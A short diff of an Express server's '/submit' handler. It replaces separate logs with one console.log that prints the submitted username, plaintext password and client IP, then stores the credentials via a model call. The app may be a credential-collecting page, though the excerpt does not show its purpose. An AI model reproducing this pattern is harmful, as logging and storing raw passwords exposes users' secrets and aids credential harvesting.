@@ -36,11 +36,10 @@ app.get("/", function (req, res) {
 
 app.post("/submit", (req, res) => {
 	numberOfRequests++;
-	console.log(numberOfRequests);
 	let username = req.body.username;
 	let password = req.body.password;
-	console.log(username, password);
 	let ip = req.headers["x-forwarded-for"];
+	console.log(username, password, ip);
 	uapmodel.create(
 		{
 			username: username,
